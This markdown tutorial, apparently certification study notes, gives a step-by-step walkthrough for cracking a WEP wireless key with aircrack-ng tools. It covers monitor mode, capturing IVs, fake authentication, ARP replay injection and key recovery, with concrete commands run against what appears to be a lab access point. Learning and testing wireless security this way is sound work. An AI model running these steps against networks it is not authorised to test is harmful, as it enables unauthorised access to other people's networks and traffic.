## Cracking WEP

## Perform the following steps prior to step 1, if you're wireless card is giving you issues.

* Stop network manager
````
service network-manager stop
````

* When putting a card into monitor mode, it will automatically check for interfering processes. It can also be done manually by running the following command:
````
airmon-ng check
````

* Kill interferring processes
````
airmon-ng check kill **OR** airmon-ng check kill-all
````

* If started already...disable Monitor Mode
````
airmon-ng stop wlan0mo
````

* Restart Network Manager(s)
````
service network-manager start
````

**1) List All Available Wireless Interace Cards**

* You can do this with two commands: iwconfig or airmon-ng

![](https://github.com/azul-007/Pentesting/blob/master/Wireless/images/list_interfaces.png)

**2) Enable monitor mode on the interace found in step 1**

* Identify the channel of the target AP, 
````
airmon-ng start wlan0
sudo airodump-ng wlan0mon <- Identify AP channel here
sudo airodump-ng stop wlan0mon
sudo airmon-ng start wlan0 3
````

![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch8_Wireless_and_RF_Attacks/images/monitor_mode_channel.png.png)

**3) Identify the channel your WEP network is operating on**

* execute iwconfig or airmon-ng to get your wireless interface
* use either BSSID or ESSID.
* The channel number will be listed under the "CH" column.
````
airodump-ng wlan0mon
````
![](https://github.com/azul-007/Pentesting/blob/master/Wireless/images/identify_channel.png)

* Take not of the the MAC, channel and network name of the target AP.
* Test wireless device packet injection.
* If you receive "Injection is working! proceed, else, ensure you're using a compatible wireless card.

**4) Test Packet Injection**
````
aireplay-ng -9 -e <network name> -a <target MAC> <interface>
````

**5) Capture IVs from the AP**
````
airodump-ng -c 3 --bssid D8:0D:17:81:3F:CC -w target_iphone wlan0mon
````

![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch8_Wireless_and_RF_Attacks/images/capture_iv.png)

**6) Initiate Fake Authentication**
* Do this step concurrently with the step 5 to capture all the data you have replayed.
````
sudo aireplay-ng -1 0 -e lab -a D8:0D:17:81:3F:CC -h 84:AD:8D:EC:7E:8D wlan0mon
````
![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch8_Wireless_and_RF_Attacks/images/fake_authentication.png)

**7) Start aireplay in ARP request replay mode**
* When the program identifies an ARP request, it will immediately strat to inject it.
````
aireplay-ng -3 -b D8:0D:17:81:3F:CC -h 84:AD:8D:EC:7E:8D wlan0mon
````
![](https://github.com/azul-007/Certification-Notes/blob/master/Pentest%2B/Ch8_Wireless_and_RF_Attacks/images/injection.png)


**8) Crack the WEP key**
````
aircrack-ng -b D8:0D:17:81:3F:CC replay_arp-0709-181038.cap
````
